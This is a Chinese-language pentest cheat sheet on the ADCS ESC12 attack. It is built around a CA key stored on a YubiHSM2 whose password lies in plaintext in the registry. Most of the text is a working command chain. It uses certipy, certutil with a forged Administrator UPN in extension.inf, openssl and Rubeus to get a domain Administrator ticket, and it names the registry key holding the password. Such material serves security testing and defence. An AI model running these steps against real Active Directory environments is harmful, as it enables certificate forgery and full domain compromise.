# Active Directory - 证书 ESC12

## ESC12 - YubiHSM 上的 ADCS CA

> ESC12 漏洞发生在证书颁发机构（CA）将其私钥存储在 YubiHSM2 设备上时。该设备需要一个认证密钥（密码）才能访问，而此密码以明文形式存储在注册表中，使得拥有 CA 服务器 Shell 访问权限的攻击者能够恢复私钥。

**前提条件**：

* CA 证书
* 根 CA 服务器的 Shell 访问权限

**利用方法**：

* 为用户生成证书

  ```ps1
  certipy req -target dc-esc.esc.local -dc-ip 10.10.10.10 -u "user_esc12@esc.local" -p 'P@ssw0rd' -template User -ca <CA-Common-Name>
  certipy cert -pfx user_esc12.pfx -nokey -out user_esc12.crt
  certipy cert -pfx user_esc12.pfx -nocert -out user_esc12.key
  ```

* 将 CA 证书导入用户存储

  ```ps1
  certutil -addstore -user my .\Root-CA-5.cer
  ```

* 与 YubiHSM2 设备中的私钥关联

  ```ps1
  certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA-Common-Name>
  ```

* 使用 `extension.inf` 文件签名 `user_esc12.crt` 并指定 `主体备用名称`

  ```ps1
  certutil -sign ./user_esc12.crt new.crt @extension.inf
  ```

* extension.inf 文件内容

  ```cs
  [Extensions]
  2.5.29.17 = "{text}"
  _continue_ = "UPN=Administrator@esc.local&"
  ```

* 使用证书获取 Administrator 的 TGT

  ```ps1
  openssl.exe pkcs12 -export -in new.crt -inkey user_esc12.key -out user_esc12_Administrator.pfx
  Rubeus.exe asktgt /user:Administrator /certificate:user_esc12_Administrator.pfx /domain:esc.local /dc:192.168.1.2 /show /nowrap
  ```

通过注册表键 `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` 中的明文密码来解锁 YubiHSM。

## 参考资料

* [ESC12 – Shell access to ADCS CA with YubiHSM - hajo - October 2023](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
* [GOAD - part 14 - ADCS 5/7/9/10/11/13/14/15 - Mayfly - March 10, 2025](https://mayfly277.github.io/posts/ADCS-part14/)
* [Exploitation de l'AD CS : ESC12, ESC13 et ESC14 - Guillon Bony Rémi - February, 2025](https://connect.ed-diamond.com/misc/mischs-031/exploitation-de-l-ad-cs-esc12-esc13-et-esc14)
